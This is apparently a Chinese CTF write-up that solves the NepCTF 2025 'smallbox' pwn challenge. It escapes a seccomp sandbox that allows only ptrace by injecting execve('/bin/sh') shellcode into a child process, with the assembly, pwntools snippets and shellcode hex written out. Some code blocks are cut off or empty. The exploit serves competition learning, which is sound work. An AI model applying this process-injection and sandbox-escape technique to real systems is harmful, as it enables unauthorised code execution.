
# [原创]NepCTF 2025 Pwn赛题smallbox解析：如何靠一条ptrace指令逃出沙箱？
## smallbox
## 前言
题目名：smallbox
解题数：52
题目描述：你能从这个小盒子里逃出来吗？
知识点：沙箱绕过（只允许ptrace）
`ptrace` 是 Linux 系统中一个非常重要的系统调用，它允许一个进程观察和控制另一个进程的执行，并可以检查和修改被跟踪进程的内存和寄存器。
这个系统调用是实现调试器(如 `gdb`)和Hook的核心机制，函数原型：
```c
#include <sys/ptrace.h>
long ptrace(enum \_\_ptrace\_request request, pid\_t pid, void \*addr, void \*data);
```
- `request`: 指定要执行的操作类型，可以是以下值之一：
- `PTRACE\_TRACEME`: 表示当前进程将被其父进程跟踪
- `PTRACE\_PEEKTEXT`, `PTRACE\_PEEKDATA`: 从被跟踪进程的内存中读取一个字
- `PTRACE\_POKETEXT`, `PTRACE\_POKEDATA`: 向被跟踪进程的内存中写入一个字
- `PTRACE\_GETREGS`, `PTRACE\_GETFPREGS`: 获取被跟踪进程的寄存器值
- `PTRACE\_SETREGS`, `PTRACE\_SETFPREGS`: 设置被跟踪进程的寄存器值
- `PTRACE\_CONT`: 继续执行被跟踪的进程
- `PTRACE\_SINGLESTEP`: 单步执行被跟踪的进程
- `PTRACE\_SYSCALL`: 继续执行并在下一个系统调用入口或出口处停止
- `PTRACE\_ATTACH`: 附加到指定的进程并开始跟踪
- `PTRACE\_DETACH`: 停止跟踪并让被跟踪进程继续执行
- 以及其他更多选项...
- `pid`: 目标进程的进程ID
- `addr`: 内存地址，具体含义取决于request参数
- `data`: 数据指针，具体含义取决于request参数
## 逆向分析
逆向分析非常简单，找到`main`函数：
![image-20250730212311672](upload/attach/202508/912098\_SVCMEYNWKHHTCP4.png)
程序先通过`mmap`函数申请地址`0xDEADC0DE000LL`处的0x1000大小的空间，并赋予`rwx`权限。
然后执行`fork`函数创建子进程，并让子进程进入`while(1);`死循环。
父进程继续执行，读取我们的输入到`0xDEADC0DE000LL`内存，加载沙箱，最后将我们的输入作为汇编指令执行。
## 利用思路
### 查看沙箱保护
我们使用`seccomp-tools`工具查看程序的沙箱保护情况：
![image-20250730212555270](upload/attach/202508/912098\_EDPS67ZFMWBWJVD.png)
程序只允许我们执行`ptrace`系统调用，这其实给我们提示了这道题目的解题方法。
### 整体利用思路
我们输入的汇编指令需要多次通过`ptrace`系统调用拿下Shell：
1. 通过汇编指令获取子进程的`pid`。
2. 通过`PTRACE\_ATTACH`附加子进程。
3. 通过`PTRACE\_POKETEXT`将`shellcode`写入到子进程。
4. 通过`PTRACE\_GETREGS`获取子进程的寄存器的值。
5. 修改`RIP`寄存器指向我们的`shellcode`。
6. 通过`PTRACE\_SETREGS`将修改后的寄存器的值写入子进程。
7. 通过`PTRACE\_DETACH`让子进程脱离附加状态，继续自主运行。
### 详细利用思路
通过上述操作，子进程最终会执行我们写入的`shellcode`，具体步骤如下所示。
1. 通过汇编指令获取子进程的`pid`。
通过`fork`函数获取的`子进程pid`会被存储在变量`pid（rbp-0xC）`中，我们将其存储到`rbx`寄存器中：
```assembly
xor rbx, rbx
mov ebx, dword ptr [rbp-0xc]
```
可以使用`gdb`调试，查看`rbx`寄存器的内容是否被正确修改：
```python
shellcode = asm("""
xor rbx, rbx
mov ebx, dword ptr [rbp-0xc]
""")
gdb.attach(p, 'b \*$rebase(0x143F)\nc')
pause()
p.sendafter(b'shellcode: \n', shellcode)
```
![image-20250730213539789](upload/attach/202508/912098\_F3ZDA3ZQ7BNNSTG.png)
可以看到，`rbx`寄存器的值成功被修改为`子进程的pid`。
2. 使用`PTRACE\_ATTACH`附加子进程。
```c
int ptrace(PTRACE\_ATTACH, target\_pid, NULL, NULL);
```
对应的汇编代码：
```assembly
mov rdi, 16
mov rsi, rbx
xor rdx, rdx
xor r10, r10
mov rax, 101
syscall
```
对应的脚本：

3. 通过`PTRACE\_POKETEXT`将`shellcode`写入到子进程。

```python
push rsp
pop rdi

xor edx,edx
push 0x3b
pop rax
syscall
""")
for i in range(0, len(shellcode), 8):
print(hex(u64(shellcode[i:i+8].ljust(8, b'\x00'))))
# 0x732f6e69622fbb48
# 0x31f6315f54530068
# 0x50f583b6ad2
```

4. 通过`PTRACE\_GETREGS`获取子进程的寄存器的值。
```c
int ptrace(PTRACE\_GETREGS, pid, NULL, &regs);
```
需要注意的是，第四个参数是主进程的内存空间地址，即存储`regs`的内存位置。
对应的汇编代码：
```assembly
mov rdi, 12
mov rsi, rbx
xor rdx, rdx
lea r10, [rbp-0x200]
mov rax, 101
syscall
```

5. 修改`RIP`寄存器指向我们的`shellcode`。
根据`user\_regs\_struct`结构体，`&user\_regs\_struct + 0x80`位置存储了子进程的RIP指针的值。
我们使用汇编指令将其修改为写入的`shellcode`的地址：
```assembly
mov rax, 0xDEADC0DE000
lea rdi, [rbp-0x200]
add rdi, 0x80
mov [rdi], rax
```
6. 通过`PTRACE\_SETREGS`将修改后的寄存器的值写入子进程。
最后，将修改后的`RIP`指针的值写回到子进程中，方法同`PTRACE\_GETREGS`，不再赘述。
```c
int ptrace(PTRACE\_SETREGS, pid, NULL, &regs);
```
对应的汇编：
```assembly
mov rdi, 13
mov rsi, rbx
xor rdx, rdx
lea r10, [rbp-0x200]
mov rax, 101
syscall
```
